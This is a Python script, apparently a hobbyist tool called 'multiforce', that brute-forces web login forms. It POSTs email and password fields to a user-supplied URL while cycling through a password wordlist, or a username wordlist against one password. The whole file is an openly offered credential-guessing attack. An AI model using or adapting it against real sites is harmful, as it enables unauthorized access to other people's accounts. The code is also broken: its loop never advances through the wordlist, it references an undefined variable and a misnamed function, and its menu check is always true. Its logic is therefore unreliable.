import requests
import os
import time
#tool name: multiforce
def help():
	print("""
	Bruteforce is the use of a wordlist(of password) in guessing the password of the target
	Weakforce is the use of a wordlist(of username) in guessing the username that use the specified password
	**Coming soon
	Doubleforce combine bruteforce and weakforce 
	
	""")
	f = open("logs.txt", "w").write("already")
try:
	f = open("logs.txt", "r")
except FileNotFoundError:
	help()
#os.system("figlet -f small Multi-Force")
print("""
             | author : XnetwolfX/Xnetwolf
             |  Bruteforce and Weakforce
""")
print("")
url = input("url <~> ")
use = input("username/filename <~> ")
pas = input("password/filename <~> ")
print("""
{1} Bruteforce
{2} Weakforce
""")
option = input("μ~> ")
def Bruteforce(url, user, pas):
	print("Ready to attack")
	time.sleep(2)
	print("attack started")
	os.system("clear")
	
	#attack
	start = 0
	var = 0
	passw_1 = open(pas, "r")
	passw = passw_1.read().split("\n")
	while start == 0:
		pase = passw[var]
		payload = {
		"email":f"{user}", 
		"pass":f"{pase}"
		}
		urlcon = requests.post(url, data=payload)
		if f"{user}" in urlcon.text:
			print(f"password found <~> {pase}")
		else:
			print(f"Not the password <~> {pase}")
			end = end + 1
	#old
def weakforce(url, user, pas):
	print("Ready to attack")
	time.sleep(2)
	print("attack started")
	os.system("clear")
	
	#attack
	start = 0
	var = 0
	passw_1 = open(user, "r")
	passw = passw_1.read().split("\n")
	while start == 0:
		pase = passw[var]
		payload = {
		"email":f"{pase}", 
		"pass":f"{pas}"
		}
		urlcon = requests.post(url, data=payload)
		if f"{user}" in urlcon.text:
			print(f"username found <~> {user}")
		else:
			print(f"username not found <~> {user}")
			end = end + 1
	
if option == "1" or 1:
	print(f"% starting bruteforce for {url} %")
	Bruteforce(url, use, pas)
elif option == "2" or 2:
	print(f"% starting weakforce for {url} %")
	Weakforce(url, use, pas)
else:
	print("try later or upgrade tool ")
	